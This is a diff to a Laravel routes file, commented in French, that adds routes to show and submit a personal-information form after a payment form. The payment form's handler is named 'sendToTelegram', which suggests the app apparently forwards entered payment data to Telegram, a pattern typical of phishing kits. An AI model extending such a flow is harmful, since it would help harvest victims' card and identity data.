@@ -13,6 +13,15 @@ Route::get('/', function () {
 // Traitement du premier formulaire
 Route::post('/send-payment', [PaymentController::class, 'sendToTelegram'])
     ->name('payment.send');
+
+// Page d'informations personnelles
+Route::get('/personal-info', function () {
+    return view('personal-info');
+})->name('personal-info');
+
+// Traitement du formulaire d'informations personnelles
+Route::post('/personal-info', [PaymentController::class, 'storePersonalInfo'])
+    ->name('personal-info.submit');
 ////////////////////////////////////////////////////////////////////////
 // Affichage de la page réservation
 Route::get('/reservation', function () {
